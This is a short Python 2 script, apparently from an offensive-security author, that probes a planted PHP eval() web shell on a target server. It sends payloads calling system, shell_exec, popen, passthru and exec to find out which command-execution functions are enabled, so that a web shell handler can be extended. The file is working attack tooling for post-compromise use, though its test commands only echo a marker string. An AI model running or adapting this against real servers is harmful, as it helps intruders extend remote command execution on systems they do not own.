#!/usr/bin/python
import requests
import sys
print """
eval() based shell system command execution function checker.
Uses a shell like <?php eval($_GET['test']); ?> to test enabled functions.
Currently tests system, shell_exec, popen, passthru and exec.
Written to help extend "webhandler" :)
- infodox | insecurety.net
"""

if len(sys.argv) != 2:
    print "Usage: ./tester.py <targeturl>"
    print "Example: ./tester.py http://localhost/test.php?eval="
    sys.exit(0)

url = sys.argv[1]
print "[+] Testing system"
system = """system('echo w00tw00t');"""
testurl = url + system
h = requests.get(testurl)
if "w00tw00t" in h.text:
    print "[*] system function works!\n"
else:
    print "[*] system function seems disabled!\n"
print "[+] Testing shell_exec"
shellexec = """echo shell_exec('echo w00tw00t');"""
testurl = url + shellexec
i = requests.get(testurl)
if "w00tw00t" in i.text:
    print "[*] shell_exec function works!\n"
else:
    print "[*] shell_exec function seems disabled!\n"
print "[+] Testing popen"
pop = """popen('echo w00tw00t');"""
testurl = url + pop
j = requests.get(testurl)
if "w00tw00t" in j.text:
    print "[*] popen function works!\n"
else:
    print "[*] popen function seems disabled!\n"
print "[+] Testing passthru"
passthru = """passthru('echo w00tw00t');"""
testurl = url + passthru
k = requests.get(testurl)
if "w00tw00t" in k.text:
    print "[*] passthru function works!\n"      
else:
    print "[*] passthru function seems disabled!\n"
print "[+] Testing exec"
exe = """echo exec('echo w00tw00t');"""
testurl = url + exe
l = requests.get(testurl)
if "w00tw00t" in l.text:
    print "[*] exec function works!\n"
else:
    print "[*] exec function seems disabled!\n"
